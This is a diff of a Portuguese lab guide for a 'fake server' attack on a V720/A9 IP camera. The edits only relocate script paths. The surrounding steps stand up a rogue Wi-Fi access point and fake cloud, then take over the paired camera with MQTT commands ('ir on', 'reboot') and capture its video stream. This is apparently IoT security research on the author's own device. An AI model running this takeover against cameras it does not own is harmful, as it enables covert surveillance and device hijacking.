@@ -7,18 +7,18 @@ Prova o vetor **fake server**: a câmera aceita qualquer servidor que se diga o 
 Tudo roda numa máquina Linux. O Mac fica só como workstation (git, edição, análise de pcap).
 
 
-## Atalho — script único ([fakesrv_lab.sh](fakesrv_lab.sh))
+## Atalho — script único ([fakesrv_lab.sh](../scripts/fakeserver/fakesrv_lab.sh))
 
 Em vez de copiar comando por comando, o script sobe a **Fase 1 a 5** de uma vez. Cada processo roda **em background** gravando num log próprio em [docs/mitm_out/](mitm_out/) (`radio.log`, `hostapd.log`, `dnsmasq.log`, `mosquitto.log`, `mqtt.log`, `server.log`). Sem `tmux`, sem janela pra gerenciar.
 
 ```bash
-sudo ./scripts/fakesrv_lab.sh up          # Fase 1..5: limpa o rádio, escreve os configs, sobe hostapd/dnsmasq/mosquitto/fake server
-sudo ./scripts/fakesrv_lab.sh status      # PID vivo? portas 80/1883/53? últimas linhas de cada log + erros de rádio
-sudo ./scripts/fakesrv_lab.sh watch       # tail -f de todos os logs juntos, ao vivo (Ctrl-C sai, não mata nada)
-sudo ./scripts/fakesrv_lab.sh logs server # despeja um log (ou todos, sem argumento). 'logs server 0' = log inteiro
-sudo ./scripts/fakesrv_lab.sh bundle      # junta logs + status + configs + dmesg num arquivo pra anexar/colar
-sudo ./scripts/fakesrv_lab.sh cheat       # passos manuais da Fase 6/7/8
-sudo ./scripts/fakesrv_lab.sh down        # mata tudo e restaura a rede (unmask NetworkManager, power_save on)
+sudo ./scripts/fakeserver/fakesrv_lab.sh up          # Fase 1..5: limpa o rádio, escreve os configs, sobe hostapd/dnsmasq/mosquitto/fake server
+sudo ./scripts/fakeserver/fakesrv_lab.sh status      # PID vivo? portas 80/1883/53? últimas linhas de cada log + erros de rádio
+sudo ./scripts/fakeserver/fakesrv_lab.sh watch       # tail -f de todos os logs juntos, ao vivo (Ctrl-C sai, não mata nada)
+sudo ./scripts/fakeserver/fakesrv_lab.sh logs server # despeja um log (ou todos, sem argumento). 'logs server 0' = log inteiro
+sudo ./scripts/fakeserver/fakesrv_lab.sh bundle      # junta logs + status + configs + dmesg num arquivo pra anexar/colar
+sudo ./scripts/fakeserver/fakesrv_lab.sh cheat       # passos manuais da Fase 6/7/8
+sudo ./scripts/fakeserver/fakesrv_lab.sh down        # mata tudo e restaura a rede (unmask NetworkManager, power_save on)
 ```
 
 `up --terms` (ou `restart --terms`) também abre **uma janela de terminal por log** (`tail -F`), se você tiver ambiente gráfico — a janela é só visão, fechar não mata o processo.
@@ -26,16 +26,16 @@ sudo ./scripts/fakesrv_lab.sh down        # mata tudo e restaura a rede (unmask 
 Ele já roda o checkpoint do `dig` e espera o `AP-ENABLED` sozinho, avisando em amarelo/vermelho se algo falhou. A **Fase 6** (parear a câmera pelo app) continua manual. Depois dela, `fakesrv_lab.sh takeover` faz a **Fase 7** (comandos MQTT + coleta da resposta) e a **Fase 8** (extração do `<id>`, `tcpdump`, `snapshot`/`live`, `extract_mitm_video`) sozinho — `fakesrv_lab.sh cheat` mostra os passos manuais equivalentes.
 
 ```bash
-sudo ./scripts/fakesrv_lab.sh takeover                    # espera a câmera online, manda 'ir on;reboot', prova stream
-sudo ./scripts/fakesrv_lab.sh takeover --no-stream 'ir on'  # só a Fase 7, comando custom
+sudo ./scripts/fakeserver/fakesrv_lab.sh takeover                    # espera a câmera online, manda 'ir on;reboot', prova stream
+sudo ./scripts/fakeserver/fakesrv_lab.sh takeover --no-stream 'ir on'  # só a Fase 7, comando custom
 # overrides: TAKEOVER_CMDS='ir on;reboot'  ONLINE_TIMEOUT=180  RESP_WAIT=20  STREAM_SECS=15  P2P_WAIT=30
 ```
 
 Artefatos ficam em `docs/mitm_out/takeover_<data>.{log,pcap,jpg,mjpg}` (+ frames do `extract_mitm_video`) e entram no `bundle`. O takeover também grava `takeover_<data>_sent.log` (marcadores de envio, em arquivo separado do log do subscriber) e `takeover_<data>_baseline.json` (Device/Info antes dos comandos, pra diff).
 
-Dongle ath9k no lugar da Intel interna: `IFACE=wlan1 sudo ./scripts/fakesrv_lab.sh up`. Outros overrides por env: `AP_IP`, `SSID`, `PASS`, `CHANNEL`, `DEV`.
+Dongle ath9k no lugar da Intel interna: `IFACE=wlan1 sudo ./scripts/fakeserver/fakesrv_lab.sh up`. Outros overrides por env: `AP_IP`, `SSID`, `PASS`, `CHANNEL`, `DEV`.
 
-> Pra mandar os logs aqui pra análise: `sudo ./scripts/fakesrv_lab.sh bundle` gera `docs/mitm_out/report_<data>.txt` com tudo junto (cores removidas). Anexa esse arquivo.
+> Pra mandar os logs aqui pra análise: `sudo ./scripts/fakeserver/fakesrv_lab.sh bundle` gera `docs/mitm_out/report_<data>.txt` com tudo junto (cores removidas). Anexa esse arquivo.
 
 O passo a passo abaixo é a referência do que o script faz (e o que rodar na mão se preferir).
 
@@ -203,7 +203,7 @@ Isso é a **prova-raiz**: câmera aceitou cloud falso e ficou escutando comandos
 Depois que a câmera pareou (Fase 6), num terminal só:
 
 ```bash
-sudo ./scripts/fakesrv_lab.sh takeover
+sudo ./scripts/fakeserver/fakesrv_lab.sh takeover
 ```
 
 O que ele faz:
@@ -214,7 +214,7 @@ O que ele faz:
 5. Lista os artefatos: `takeover_<data>.{log,pcap,jpg,mjpg}` (+ `_sent.log`, `_baseline.json`). Tudo entra no `bundle`.
 
 ```bash
-sudo ./scripts/fakesrv_lab.sh takeover --no-stream 'ir on'   # só a Fase 7, comando custom
+sudo ./scripts/fakeserver/fakesrv_lab.sh takeover --no-stream 'ir on'   # só a Fase 7, comando custom
 # overrides: TAKEOVER_CMDS='ir on;reboot'  ONLINE_TIMEOUT=180  RESP_WAIT=20  STREAM_SECS=15  P2P_WAIT=30
 ```
 
@@ -225,9 +225,9 @@ Se o registro P2P (`:6123`) não acontecer, a Fase 8 avisa e para — a Fase 7 s
 O fake server é **reativo**: ele só responde quando a câmera inicia o canal `:6123` (`code 100`). Quem "chama" a câmera é o **app** (ao abrir o viewer) — e esse comando de chamada não está documentado no repo. Para aprendê-lo observando (em vez de chutar), use a sonda passiva:
 
 ```bash
-sudo ./scripts/p2p_probe.sh           # sobe a sonda (sub MQTT + pcap do :6123)
+sudo ./scripts/mitm/p2p_probe.sh           # sobe a sonda (sub MQTT + pcap do :6123)
 # no celular: app V720 -> abrir o viewer da câmera -> esperar ~15s
-sudo ./scripts/p2p_probe.sh stop      # derruba e mostra o que capturou
+sudo ./scripts/mitm/p2p_probe.sh stop      # derruba e mostra o que capturou
 ```
 
 Ela grava `docs/mitm_out/p2p_probe/mqtt.log` (todos os tópicos, com timestamp) e `6123.pcap` (tráfego do canal). Na saída, ela destaca qualquer tópico MQTT diferente do `sub/<DEV>`/`Status`/`Info` — se aparecer algo tipo `Device/req`/`call`/`invite`, o payload é o comando que falta reproduzir no fake server para a Fase 8 (stream) funcionar de ponta a ponta.
@@ -236,15 +236,15 @@ Ela grava `docs/mitm_out/p2p_probe/mqtt.log` (todos os tópicos, com timestamp) 
 
 ```bash
 # Terminal 5 - escuta
-BROKER=192.168.50.1 ./scripts/fake_srv_cmd.sh listen | tee docs/mitm_out/mqtt_proof.log
+BROKER=192.168.50.1 ./scripts/fakeserver/fake_srv_cmd.sh listen | tee docs/mitm_out/mqtt_proof.log
 # Terminal 6 - comandos (enquanto a câmera está online)
 export BROKER=192.168.50.1 DEV=5c001502B330
-./scripts/fake_srv_cmd.sh ir on
-./scripts/fake_srv_cmd.sh reboot
+./scripts/fakeserver/fake_srv_cmd.sh ir on
+./scripts/fakeserver/fake_srv_cmd.sh reboot
 # Fase 8: <id> do Terminal 4, navegador do Kali (só depois do registro P2P :6123)
 #   http://127.0.0.1/dev/list   e   http://127.0.0.1/dev/<id>/live
 sudo tcpdump -i wlan0 -w docs/mitm_out/fakesrv_stream.pcap host 192.168.50.10
-python3 scripts/extract_mitm_video.py docs/mitm_out/fakesrv_stream.pcap --out docs/mitm_out/fakesrv
+python3 scripts/utils/extract_mitm_video.py docs/mitm_out/fakesrv_stream.pcap --out docs/mitm_out/fakesrv
 ```
 
 ---
@@ -342,7 +342,7 @@ Com o dongle, a `wlan0` interna nem entra: o dongle sobe como `wlan1`. Troque `w
 4. mosquitto restart                                    -> 1883 LISTEN
 5. T4: sudo FAKE_SRV_HOST=192.168.50.1 python3 src/a9_naxclow.py -s -v
 6. celular no fakesrv -> app manda camera -> registra (ve nos logs)
-7+8. sudo ./scripts/fakesrv_lab.sh takeover   (espera camera online -> comandos MQTT -> resposta -> <id> -> tcpdump -> live -> extract)
+7+8. sudo ./scripts/fakeserver/fakesrv_lab.sh takeover   (espera camera online -> comandos MQTT -> resposta -> <id> -> tcpdump -> live -> extract)
      na mao: T5 listen + T6 comandos MQTT ; /dev/<id>/live + tcpdump
 9. depois: pkill hostapd/dnsmasq -> systemctl unmask+start NetworkManager -> conferir pgrep sem sobras
 ```
